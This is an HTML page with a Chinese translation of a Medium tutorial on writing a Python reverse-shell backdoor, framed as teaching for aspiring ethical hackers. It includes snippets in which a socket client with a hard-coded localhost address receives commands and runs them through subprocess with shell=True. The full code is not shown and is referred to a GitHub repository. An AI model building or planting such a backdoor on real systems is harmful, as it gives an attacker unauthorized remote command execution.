<html>
<head>
<title>Creating a Backdoor in Python</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">在Python中创建后门</h1>
<blockquote>原文：<a href="https://betterprogramming.pub/creating-a-backdoor-in-python-558fd4ca2a1b?source=collection_archive---------6-----------------------#2022-09-12">https://betterprogramming.pub/creating-a-backdoor-in-python-558fd4ca2a1b?source=collection_archive---------6-----------------------#2022-09-12</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><div class=""><h2 id="d386" class="pw-subtitle-paragraph jq is it bd b jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh dk translated">另一个很酷的网络安全教程</h2></div><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi ki"><img src="../Images/0bb6c8215d6e10ab583767900cc35037.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*deJ45R8q1b7H9SzY"/></div></div><p class="ku kv gj gh gi kw kx bd b be z dk translated">由<a class="ae ky" href="https://unsplash.com/es/@pechka?utm_source=medium&amp;utm_medium=referral" rel="noopener ugc nofollow" target="_blank">马頔·佩丘林</a>在<a class="ae ky" href="https://unsplash.com?utm_source=medium&amp;utm_medium=referral" rel="noopener ugc nofollow" target="_blank"> Unsplash </a>拍摄的照片</p></figure><p id="f6d9" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">简单来说，后门程序是一种让用户远程访问目标机器的程序。</p><p id="f5cc" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">后门的主要目的是向目标机器发送和接收命令(和数据),以获取有价值的数据或增加目标机器和网络上的权限。</p><p id="1357" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">为了促进这种交互，黑客在目标机器上安装恶意代码，创建连接并允许黑客发送信息。</p><p id="5a56" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">外壳是软件的一个重要部分，有道德的黑客可以用它在合同期间进行渗透测试。在这篇文章中，我们将教有抱负的道德黑客如何制作他们的第一个外壳。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div class="gh gi lv"><img src="../Images/895dcc2d68ee9ed76b39e9eed41bd40d.png" data-original-src="https://miro.medium.com/v2/resize:fit:542/format:webp/1*JXilaphTIwVWfVBCOsVcjw.png"/></div><p class="ku kv gj gh gi kw kx bd b be z dk translated">来源:<a class="ae ky" href="https://www.ivoidwarranties.tech/posts/pentesting-tuts/metasploit/simple-attack/" rel="noopener ugc nofollow" target="_blank">https://www . ivoid warranties . tech/posts/pentesting-tuts/metasploit/simple-attack/</a></p></figure><p id="d392" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">在信息安全领域，存在两种类型的有效载荷:外壳和反向外壳。</p><p id="8e8a" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">Shells直接在黑客可以连接的目标机器上创建服务器。</p><p id="a9e3" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">反向外壳有一个客户端组件和一个服务器组件。运行在目标机器上的客户端已经拥有攻击者的IP地址。</p><p id="8b8a" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">因为初始连接的方向是“反向的”(从受害者到攻击者)，所以外壳被称为反向外壳。向前发展，我们将编码一个反向外壳。目标将被称为受害者，而黑客的机器将被称为攻击者。</p><p id="68da" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">首先，我们必须创建将在攻击者身上运行的服务器。有如下四个步骤:</p><ol class=""><li id="8ee5" class="lw lx it lb b lc ld lf lg li ly lm lz lq ma lu mb mc md me bi translated">获取我们的本地IP和指定端口。</li><li id="d52f" class="lw lx it lb b lc mf lf mg li mh lm mi lq mj lu mb mc md me bi translated">绑定IP和端口以创建套接字。</li><li id="dbcf" class="lw lx it lb b lc mf lf mg li mh lm mi lq mj lu mb mc md me bi translated">启动监听器。</li><li id="9384" class="lw lx it lb b lc mf lf mg li mh lm mi lq mj lu mb mc md me bi translated">在无限循环中发送和接收命令。</li></ol><figure class="kj kk kl km gt kn"><div class="bz fp l di"><div class="mk ml l"/></div></figure><p id="4cf4" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">接下来，我们将基于硬编码的IP和端口连接到攻击者，因为它无法动态检索这些IP和端口。</p><p id="aadc" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">因为我们在本地机器上运行这个反向shell，所以套接字看起来像这样:</p><pre class="kj kk kl km gt mm mn mo mp aw mq bi"><span id="fd9f" class="mr ms it mn b gy mt mu l mv mw">REMOTE_HOST = '127.0.0.1'</span><span id="3e69" class="mr ms it mn b gy mx mu l mv mw">REMOTE_PORT = 8081 # 2222</span><span id="60ab" class="mr ms it mn b gy mx mu l mv mw">client = socket.socket()</span></pre><p id="ce03" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">此外，我们必须接收命令并使用库<code class="fe my mz na mn b">subproccess</code>来打开终端并并行运行命令。这就是它的样子:</p><pre class="kj kk kl km gt mm mn mo mp aw mq bi"><span id="7e50" class="mr ms it mn b gy mt mu l mv mw">command = client.recv(1024)</span><span id="ab3b" class="mr ms it mn b gy mx mu l mv mw">command = command.decode()</span><span id="3ba5" class="mr ms it mn b gy mx mu l mv mw">op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)</span></pre><p id="d8fb" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">服务器的完整代码如下:</p><figure class="kj kk kl km gt kn"><div class="bz fp l di"><div class="mk ml l"/></div></figure><p id="1e5a" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">下面是一个反向外壳的例子:</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi nb"><img src="../Images/e93b78bffdf3a8466f0c3d42108253dd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8P2PPn_cfP0IbxJFh_5IVw.png"/></div></div><p class="ku kv gj gh gi kw kx bd b be z dk translated">左边是客户端，右边是服务器。</p></figure><p id="2e4a" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">首先运行服务器，然后运行客户机，这将允许用户像承诺的那样使用服务器发送和接收数据。请检查一下，并让我知道你的想法。</p><p id="fa35" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">完整代码见我的GitHub简介。</p><div class="nc nd gp gr ne nf"><a href="https://github.com/AleksaZatezalo/PythonBackDoor" rel="noopener  ugc nofollow" target="_blank"><div class="ng ab fo"><div class="nh ab ni cl cj nj"><h2 class="bd iu gy z fp nk fr fs nl fu fw is bi translated">GitHub-AleksaZatezalo/python backdoor</h2><div class="nm l"><h3 class="bd b gy z fp nk fr fs nl fu fw dk translated">此时您不能执行该操作。您已使用另一个标签页或窗口登录。您已在另一个选项卡中注销，或者…</h3></div><div class="nn l"><p class="bd b dl z fp nk fr fs nl fu fw dk translated">github.com</p></div></div><div class="no l"><div class="np l nq nr ns no nt ks nf"/></div></div></a></div></div></div>    
</body>
</html>